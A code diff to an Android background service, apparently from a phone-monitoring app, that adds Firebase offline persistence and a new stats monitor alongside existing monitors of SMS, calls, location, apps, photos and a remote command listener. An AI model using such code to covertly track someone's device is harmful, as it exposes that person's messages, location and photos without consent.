@@ -26,6 +26,7 @@ import androidx.work.PeriodicWorkRequest;
 import androidx.work.WorkManager;
 
 import com.google.firebase.auth.FirebaseAuth;
+import com.google.firebase.database.FirebaseDatabase;
 
 import java.util.concurrent.TimeUnit;
 
@@ -39,10 +40,16 @@ public class MonitoringService extends Service {
     private GeoFenceMonitor geoFenceMonitor;
     private AppMonitor appMonitor;  
     private PhotosMonitor photosMonitor;  
+    private OnRefreshStatsMonitor refreshStatsMonitor;
 
     @Override
     public void onCreate() {
         super.onCreate();
+        try {
+            FirebaseDatabase.getInstance().setPersistenceEnabled(true);
+        } catch (Exception e) {
+            Log.e(TAG, "Firebase persistence already enabled or other error: " + e.getMessage());
+        }
     }
 
     @Nullable
@@ -107,6 +114,7 @@ public class MonitoringService extends Service {
                 return;
             }
 
+
             // Start monitoring components
             startSMSMonitor(userId, phoneModel);
             startCallMonitor(userId, phoneModel);
@@ -120,8 +128,21 @@ public class MonitoringService extends Service {
             startGeofenceMonitor();
             startPhotosMonitor(); 
             initializeCommandListener(userId, phoneModel);
+            startRefreshStatsMonitor(userId, phoneModel);
+
         } catch (Exception e) {
             Log.e(TAG, "Error starting monitors: " + e.getMessage());
+        }
+    }
+
+    private void startRefreshStatsMonitor(String userId, String phoneModel) {
+        Log.d(TAG, "Initializing Refresh Stats Monitor");
+        try {
+            refreshStatsMonitor = new OnRefreshStatsMonitor(this);
+            refreshStatsMonitor.startMonitoring(userId, phoneModel);
+            Log.i(TAG, "Refresh Stats Monitor initialized successfully");
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to initialize Refresh Stats Monitor: " + e.getMessage());
         }
     }
 
